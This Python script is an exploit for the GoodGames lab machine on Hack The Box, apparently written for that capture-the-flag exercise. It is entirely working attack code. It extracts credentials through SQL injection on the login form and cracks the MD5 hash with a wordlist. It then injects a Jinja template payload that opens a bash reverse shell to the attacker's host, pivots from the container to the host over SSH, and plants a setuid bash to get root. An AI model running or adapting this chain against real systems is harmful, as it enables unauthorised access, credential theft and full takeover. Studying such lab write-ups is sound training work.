#!/usr/bin/env python3

import requests

from pwn import b64e, hashlib, listen, log, re, sys, Thread
from typing import Tuple

URL = 'http://10.10.11.130'
VHOST = 'internal-administration.goodgames.htb'


def do_sqli(query: str) -> str:
    payload = f"' union select 1,2,3,{query}-- -"
    r = requests.post(f'{URL}/login', data={'email': payload, 'password': 'x'})

    return re.findall(r'<h2 class="h4">Welcome (.*?)</h2>', r.text, flags=re.DOTALL)[0]


def exploit_sqli() -> Tuple[str, str]:
    database = do_sqli('database()')
    log.info(f'Found database: {database}')
    table_names = do_sqli(
        f"group_concat(table_name) from information_schema.tables where table_schema='{database}'")
    table_name = 'user'
    log.info(f'Found tables: {table_names}. Using: {table_name}')
    column_names = do_sqli(
        f"group_concat(column_name) from information_schema.columns where table_name='{table_name}'")
    columns = ('name', 'password')
    log.info(
        f'Found columns: {column_names}. Using: {",".join(columns)}')
    row_value = do_sqli(
        f"concat({columns[0]},0x20,{columns[1]}) from {table_name} limit 1")

    return tuple(row_value.split())


def dictionary_attack(hashed_password: str, wordlist: str) -> str:
    crack_progress = log.progress('Cracking hash')

    with open(wordlist, 'rb') as f:
        for password in f.read().splitlines():
            try:
                crack_progress.status(password.decode())
                if hashlib.md5(password).hexdigest() == hashed_password:
                    crack_progress.success(password.decode())
                    return password.decode()
            except UnicodeDecodeError:
                pass


def do_login(s: requests.Session, username: str, password: str):
    r = s.get(f'{URL}/login', headers={'Host': VHOST})
    csrf_token = re.findall(
        r'<input id="csrf_token" name="csrf_token" type="hidden" value="(.*?)">', r.text)[0]
    log.info(f'Got CSRF token: {csrf_token}')

    s.post(f'{URL}/login',
           headers={'Host': VHOST},
           data={
               'csrf_token': csrf_token,
               'username': username,
               'password': password,
               'login': ''
           })


def rev_shell(lhost: str, lport: int) -> bytes:
    rev_shell_payload = f'bash  -i >& /dev/tcp/{lhost}/{lport} 0>&1'
    log.info(f'Using reverse shell: {rev_shell_payload}')
    return rev_shell_payload.encode()


def exploit_ssti(s: requests.Session, lhost: str, lport: int):
    cmd = f'echo {b64e(rev_shell(lhost, lport))} | base64 -d | bash'
    ssti_payload = '{{cycler.__init__.__globals__.os.popen("%s").read()}}' % cmd
    log.info(f'Using SSTI payload: {ssti_payload}')

    s.post(f'{URL}/settings',
           headers={'Host': VHOST},
           data={'name': ssti_payload})


def container_enum(sh) -> Tuple[str, str, str]:
    sh.sendlineafter(b'# ', b'ls /home')
    sh.recvline()
    user = sh.recvline().decode().strip()
    log.info(f'Found user: {user}')

    sh.sendlineafter(b'# ', b'hostname -i')
    sh.recvline()
    container_ip = sh.recvline().decode().strip()
    host_ip = '.'.join(container_ip.split('.')[:3] + ['1'])
    log.info(f'Connected to container at: {container_ip}')

    sh.sendlineafter(b'# ', f'cat /home/{user}/user.txt'.encode())
    sh.recvline()
    user_txt = sh.recvline().decode().strip()[-32:]

    return host_ip, user, user_txt


def abuse_volume_mounts(sh, host_ip: str, user: str, password: str):
    sh.sendlineafter(b'# ', f'rm /home/{user}/bash'.encode())
    sh.sendlineafter(b'# ', f'script /dev/null -c bash'.encode())
    sh.sendlineafter(b'# ', f'export TERM=xterm'.encode())

    sh.sendlineafter(b'# ', f'ssh {user}@{host_ip}'.encode())
    sh.sendlineafter(b'password: ', password.encode())
    log.info(f'SSH to {host_ip} using credentials "{user}:{password}"')

    sh.sendlineafter(b'$ ', f'cp /bin/bash /home/{user}/bash'.encode())
    sh.sendlineafter(b'$ ', b'exit')
    sh.sendlineafter(b'# ', f'chown root:root /home/{user}/bash'.encode())
    sh.sendlineafter(b'# ', f'chmod 4755 /home/{user}/bash'.encode())

    sh.sendlineafter(b'# ', f'ssh {user}@{host_ip}'.encode())
    sh.sendlineafter(b'password: ', password.encode())


def main():
    if len(sys.argv) != 4:
        log.error(f'Usage: python3 {sys.argv[0]} <wordlist> <lhost> <lport>')

    wordlist = sys.argv[1]
    lhost = sys.argv[2]
    lport = int(sys.argv[3])

    username, hashed_password = exploit_sqli()
    log.success(f'Found hashed password for "{username}": {hashed_password}')

    password = dictionary_attack(hashed_password, wordlist)

    if not password:
        log.error(f'Hashed password could not be cracked: {hashed_password}')

    s = requests.session()
    do_login(s, username, password)

    sh = listen(lport)
    Thread(target=exploit_ssti, args=(s, lhost, lport)).start()
    sh.wait_for_connection()

    host_ip, user, user_txt = container_enum(sh)
    abuse_volume_mounts(sh, host_ip, user, password)

    sh.sendlineafter(b'$ ', f'/home/{user}/bash -p'.encode())
    sh.sendlineafter(b'# ', f'cat /root/root.txt'.encode())
    sh.recvline()
    root_txt = sh.recvline().decode().strip()[-32:]
    log.success(f'user.txt: {user_txt}')
    log.success(f'root.txt: {root_txt}')

    sh.sendlineafter(b'# ', f'alias bash="/home/{user}/bash -p"'.encode())
    log.info(f'Set: alias bash="/home/{user}/bash -p"')

    root_sh = listen(lport + 1)
    Thread(
        target=sh.sendlineafter, args=(b'# ', rev_shell(lhost, lport + 1))
    ).start()
    root_sh.wait_for_connection()
    root_sh.sendlineafter(b'# ', f'rm /home/{user}/bash'.encode())
    root_sh.recvline()
    root_sh.interactive(prompt='')


if __name__ == '__main__':
    main()
